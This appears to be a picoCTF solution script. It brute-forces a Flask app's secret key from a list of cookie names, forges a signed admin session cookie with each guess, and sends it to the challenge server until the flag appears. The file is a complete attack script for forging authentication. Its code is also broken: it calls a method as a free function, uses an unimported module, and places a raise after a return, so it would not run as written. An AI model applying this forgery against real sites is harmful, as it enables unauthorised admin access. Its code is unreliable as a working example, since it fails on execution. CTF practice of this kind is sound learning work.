# For python 3.4+
from abc import ABC, abstractmethod
# For web request
import requests
# Standard
import sys
import os
import json
from itsdangerous import base64_decode
# For argument parsing
import argparse
# External Imports
from flask.sessions import SecureCookieSessionInterface

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

    def encode(self, secret_key, session_cookie_structure):
        """ Encode a Flask session cookie """
        try:
            app = MockApp(secret_key)

            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
            si = SecureCookieSessionInterface()
            s = si.get_signing_serializer(app)

            return s.dumps(session_cookie_structure)
        except Exception as e:
            return "[Encoding error] {}".format(e)
            raise e

secret_key_pool = [ "snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "wafer", "macaron", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia" ]
url = "http://mercury.picoctf.net:18835/display"

def get_secret_key(secret_key_pool):
    for key in (secret_key_pool):
        try:
            cookie_val = encode(key, '{"very_auth": "admin" }')
            print(cookie_val)
            request = requests.get(url, cookies = { 'session' : cookie_val}, allow_redirects = False)
            print("[+] key being used: " + key)
            if 'picoCTF' in request.text:
                print("Flag found!")
                print(request.text)
                break
        except RuntimeError:
            continue
    return ""

print("Value found: " + get_secret_key(secret_key_pool))
